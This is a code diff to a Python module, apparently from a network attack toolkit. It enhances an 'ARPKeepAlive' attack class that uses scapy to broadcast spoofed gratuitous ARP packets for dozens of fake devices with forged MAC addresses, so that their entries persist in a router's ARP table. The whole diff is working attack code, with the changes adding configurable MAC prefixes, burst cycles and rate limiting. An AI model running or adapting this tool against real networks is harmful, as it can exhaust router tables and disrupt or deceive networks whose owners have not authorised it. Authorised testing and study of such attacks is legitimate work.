@@ -1,4 +1,5 @@
 import random
+import re
 import time
 import threading
 from scapy.all import Ether, ARP, sendp
@@ -7,49 +8,88 @@ from .base_attack import BaseAttack
 class ARPKeepAlive(BaseAttack):
     """Maintain fake devices in router's ARP table"""
     
-    def __init__(self, interface: str, base_ip: str, num_devices: int = 50):
+    def __init__(self, interface: str, 
+                 base_ip: str, 
+                 num_devices: int = 50, 
+                 mac_prefix: str = "02:00:00", 
+                 interval: float = 5.0, 
+                 cycles: int = 1):
         """
-        Initialize ARP keep-alive attack
-        
-        :param base_ip: Base IP address (e.g., "192.168.1.")
-        :param num_devices: Number of devices to maintain
+        Enhanced ARP keep-alive with new parameters:
+        :param mac_prefix: First 3 bytes of MAC addresses (default: 02:00:00)
+        :param interval: Seconds between announcement cycles (default: 5)
+        :param cycles: Number of ARP announcement cycles to perform (default: 1)
         """
         super().__init__(interface)
         self.base_ip = base_ip
         self.num_devices = num_devices
+        self.mac_prefix = mac_prefix
+        self.interval = interval
+        self.cycles = cycles
         self._validate_ip()
+        self._validate_mac_prefix()
 
     def _validate_ip(self):
         """Validate base IP format"""
-        if not self.base_ip.endswith(".") or len(self.base_ip.split(".")) != 4:
+        parts = self.base_ip.split('.')
+        if len(parts) != 4 or not self.base_ip.endswith('.'):
             raise ValueError("Invalid base IP format. Use format like '192.168.1.'")
+
+    def _validate_mac_prefix(self):
+        """Validate first 3 bytes of MAC address"""
+        if not re.match(r"^([0-9A-Fa-f]{2}:){2}[0-9A-Fa-f]{2}$", self.mac_prefix):
+            raise ValueError("Invalid MAC prefix. Use format like '02:00:00'")
+
+    def _generate_mac(self, ip_suffix: int) -> str:
+        """Generate deterministic MAC based on IP suffix"""
+        return f"{self.mac_prefix}:{ip_suffix:02x}:{random.randint(0, 0xff):02x}:{random.randint(0, 0xff):02x}"
 
     def _generate_arp_packet(self, ip_suffix: int):
         """Create ARP announcement packet"""
         ip = f"{self.base_ip}{ip_suffix}"
-        mac = "02:00:00:%02x:%02x:%02x" % (
-            random.randint(0, 255),
-            random.randint(0, 255),
-            random.randint(0, 255)
-        )
+        mac = self._generate_mac(ip_suffix)
         return Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
-               ARP(op=1, psrc=ip, hwsrc=mac, pdst=ip)
+               ARP(op=1, hwsrc=mac, psrc=ip, pdst=ip)
 
     def _send_arp_announcements(self):
-        """Continuous ARP sending loop"""
-        while self.running:
-            try:
-                for i in range(1, self.num_devices + 1):
-                    if not self.running:
-                        break
-                    pkt = self._generate_arp_packet(i)
+        """
+        Send exactly `self.cycles` bursts of gratuitous ARP replies,
+        waiting `self.interval` seconds between bursts.
+        """
+        # Determine inter-packet delay from rate limiter
+        pps = max(1, self.num_devices)
+        allowed_pps = self._rate_limit(pps)
+        delay = 1.0 / allowed_pps
+
+        for cycle in range(1, self.cycles + 1):
+            if not self.running:
+                break
+
+            for i in range(1, self.num_devices + 1):
+                if not self.running:
+                    break
+                pkt = self._generate_arp_packet(i)
+                try:
                     sendp(pkt, iface=self.interface, verbose=False)
-                    self.logger.info(f"ARP announced {pkt.psrc} at {pkt.hwsrc}")
-                    time.sleep(0.1)
-                time.sleep(5)
-            except Exception as e:
-                self.logger.error(f"ARP send error: {str(e)}")
-                self.stop()
+                except PermissionError as e:
+                    self.logger.warning(f"PermissionError sending ARP: {e}")
+                else:
+                    self.logger.info(f"Sent gratuitous ARP for {pkt.psrc}")
+                time.sleep(delay)
+
+            self.logger.info(
+                f"--- Completed ARP cycle {cycle}/{self.cycles}: "
+                f"{self.num_devices} packets sent; "
+                f"{'no more cycles' if cycle == self.cycles else f'sleeping {self.interval}s'} ---"
+            )
+
+            if cycle < self.cycles and self.running:
+                time.sleep(self.interval)
+
+        # After finishing all cycles, perform cleanup then exit process
+        self.running = False
+        self.logger.info("All ARP cycles complete; exiting.")
+        self.stop()
 
     def start(self):
         """Start ARP maintenance"""
@@ -60,8 +100,12 @@ class ARPKeepAlive(BaseAttack):
             self.logger.info(f"Started ARP keep-alive for {self.num_devices} devices")
 
     def stop(self):
-        """Stop ARP maintenance"""
+        """Stop ARP maintenance safely (no self-join)."""
         self.running = False
-        if self.thread and self.thread.is_alive():
+        if (
+            self.thread
+            and self.thread.is_alive()
+            and threading.current_thread() is not self.thread
+        ):
             self.thread.join()
         self.logger.info("ARP keep-alive stopped")
